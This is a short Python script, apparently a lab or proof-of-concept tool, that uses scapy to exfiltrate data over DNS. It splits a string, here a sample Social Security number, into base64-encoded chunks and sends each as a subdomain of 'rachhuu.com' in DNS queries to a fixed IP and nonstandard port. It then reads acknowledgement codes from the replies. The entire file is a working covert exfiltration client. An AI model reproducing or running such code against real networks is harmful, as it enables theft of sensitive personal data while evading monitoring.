from scapy.all import *
from scapy.layers import dns, inet
from base64 import b64encode
from time import sleep
#from scapy import all as scapy


src_ip = "10.104.13.15"
dst_ip = "10.104.114.221"
domain = "rachhuu.com"

def process(response):
    sleep(3)
    code = str(dns.DNS(response["Raw"].load).an.rdata)[-1]
    print(response)
    if int(code) == 1:
        print("Received successfully")
    elif int(code) == 2:
        print("Acknowledged end transmission")
    else:
        print("Transmission error")

def DNSRequest(subdomain):
    global domain
    d = bytes(subdomain + "." + domain,"utf-8")
    query = dns.DNSQR(qname=d)
    p = inet.IP(src=bytes(src_ip,"utf-8"),dst=bytes(dst_ip,"utf-8"))/inet.UDP(sport=1338,dport=1396)/dns.DNS(qd=query)
    sleep(3)
    print(p["DNS"].qd.qname)
    print(p["UDP"])
    result = sr1(p,verbose=True)
    print("---",p)
    sleep(5)
    print(result)
    process(result)
    

def sendData(data):
    for i in range(0,len(data),10):
        chunk = data[i:min(i+10,len(data))]
        print("Transmitting %s"%chunk)
        encoded = b64encode(bytes(chunk,"utf-8"))
        encoded = encoded.decode("utf-8").rstrip("=")
        print(encoded)
        DNSRequest(encoded)
        
        

data = "My SSN number is 111-222-3334"
sendData(data)
data = "R"
sendData(data)